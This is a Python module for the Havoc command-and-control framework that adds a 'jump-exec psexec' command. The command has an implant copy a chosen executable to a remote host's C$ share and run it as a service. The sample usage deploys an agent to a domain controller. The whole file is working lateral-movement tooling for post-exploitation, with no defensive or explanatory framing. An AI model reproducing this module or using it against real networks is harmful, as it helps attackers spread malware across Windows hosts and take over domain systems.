from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

def psexec( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    Host      : str   = ""
    SvcName   : str   = ""
    SvcPath   : str   = ""
    SvcBinary : bytes = b''

    demon = Demon( demonID )

    if len(param) < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return False

    if len(param) > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return False

    Host    = param[ 0 ]
    SvcName = param[ 1 ]
    SvcPath = param[ 2 ]

    if exists( SvcPath ) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
        return False
    else:
        SvcBinary = open( SvcPath, 'rb' ).read()
        if len(SvcBinary) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Specified service executable is empty" )
            return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute {SvcPath} on {Host} using psexec" )

    packer.addstr( Host )
    packer.addstr( SvcName )
    packer.addstr( SvcBinary )
    packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )

    demon.InlineExecute( TaskID, "go", f"psexec.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( psexec, "jump-exec", "psexec", "executes specified service on target host ", 0, "[Host] [Service Name] [Local Path]", "DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe" )
